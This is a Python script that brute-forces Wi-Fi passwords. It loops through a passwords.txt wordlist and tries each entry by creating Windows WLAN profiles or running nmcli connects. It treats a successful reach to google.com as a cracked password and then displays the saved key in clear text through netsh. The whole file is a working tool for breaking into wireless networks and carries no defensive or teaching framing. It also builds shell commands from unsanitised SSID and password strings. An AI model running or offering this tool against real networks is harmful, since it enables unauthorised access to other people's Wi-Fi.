import os
import platform
import time
import requests

internet_check_url = "http://www.google.com"
timeout_seconds = 50

def create_wifi_profile(profile_name, ssid, password):
    wifi_profile = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    
    if platform.system() == "Windows":
        wifi_profile_file = f"{profile_name}.xml"
        command = f"netsh wlan add profile filename=\"{wifi_profile_file}\" interface=Wi-Fi"
        with open(wifi_profile_file, 'w') as file:
            file.write(wifi_profile)
    elif platform.system() == "Linux":
        command = f"nmcli dev wifi connect '{ssid}' password '{password}'"
    os.system(command)
    
    if platform.system() == "Windows":
        os.remove(wifi_profile_file)

def connect_to_wifi(profile_name, ssid):
    os.system(f"netsh wlan connect name=\"{profile_name}\" ssid=\"{ssid}\" interface=Wi-Fi")

def display_available_networks():
    os.system("netsh wlan show networks interface=Wi-Fi")

print("[LOADING] Searching if connected to any network")

try:
    request = requests.get(internet_check_url, timeout=timeout_seconds)
    print("[-] Please disconnect your internet for this operation to work, try again later")
    exit()
except (requests.ConnectionError, requests.Timeout) as exception:
    print("[LOADING] Loading program...")
    time.sleep(1)

connected = True
while connected:
    try:
        display_available_networks()
        wifi_name = input("WIFI Name: ")
        with open("passwords.txt", "r") as password_file:
            for line in password_file:
                words = line.split()
                if words:
                    password = words[0]
                    print(f"Password: {password}")
                    create_wifi_profile(wifi_name, wifi_name, password)
                    connect_to_wifi(wifi_name, wifi_name)

                    try:
                        print("Connecting...")
                        time.sleep(1)
                        request = requests.get(internet_check_url, timeout=timeout_seconds)
                        connected = False
                        choice = input(f"[+] The password might have been cracked, are you connected to {wifi_name} (y/N) ? ")
                        if choice == "y":
                            print("\n[EXITING] Operation canceled")
                            exit()
                        elif choice == "n":
                            print("\n[-] Operation continues\n")

                    except (requests.ConnectionError, requests.Timeout) as exception:
                        print("[LOADING] Loading program...")
                        time.sleep(0)

        print("[+] Operation complete")
        choices = input("See WIFI Information (y/N) ? ")
        if choices.lower() == "y":
            print(f"[LOADING] Searching for {wifi_name} network")
            time.sleep(1)
            os.system(f'netsh wlan show profile name="{wifi_name}" key=clear')
            exit()
        elif choices.lower() == "n":
            print("\n[EXITING] Exiting program...")
            time.sleep(2)
            exit()

    except KeyboardInterrupt as e:
        print("\n[EXITING] Aborting program...")
        exit()
